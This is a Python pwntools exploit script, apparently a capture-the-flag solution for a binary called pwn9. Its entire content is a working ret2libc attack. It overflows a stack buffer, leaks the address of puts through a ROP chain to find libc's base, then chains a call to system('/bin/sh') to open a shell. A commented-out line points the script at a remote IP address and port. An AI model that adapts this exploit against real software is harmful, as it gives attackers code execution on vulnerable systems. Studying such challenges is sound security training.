from pwn import *

context.binary = binary = ('./pwn9')

elf = ELF(binary)
rop = ROP(elf)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process('./pwn9')
# p = remote('3.1.32.51', 8004)

payload = b'A'*56
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(elf.got.puts)
payload += p64(elf.plt.puts)
payload += p64(elf.symbols.main)

p.sendline(payload)

p.recvline()
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
print(hex(leak))

base = leak - libc.symbols.puts
print(hex(base))

system = base + libc.symbols.system
print(hex(system))

binsh = base + next(libc.search(b'/bin/sh\x00'))
print(hex(binsh))

payload1 = b'A'*56
payload1 += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload1 += p64(binsh)
payload1 += p64(0x40101a)
payload1 += p64(system)

p.sendline(payload1) 

p.interactive()